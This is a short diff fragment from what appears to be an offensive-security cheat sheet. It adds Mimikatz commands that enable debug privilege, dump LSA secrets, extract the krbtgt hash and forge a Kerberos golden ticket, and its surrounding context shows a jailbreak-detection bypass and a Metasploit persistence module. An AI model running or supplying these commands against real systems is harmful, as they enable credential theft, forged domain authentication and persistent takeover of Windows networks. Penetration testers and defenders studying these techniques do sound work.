@@ -537,6 +537,16 @@ ViewController.prototype.isJailbroken = function() {return false;}
 
 lsadumb:Sam 
 
+privilege::debug
+
+lsadump::lsa /patch
+
+lsadump::lsa /inject /name:krbtgt
+
+kerberos::golden /user: /domain: /sid: /krbtgt: /id:
+
+misc::cmd
+
 # Metasploit Persistence #
 
 use exploit/windows/local/persistence
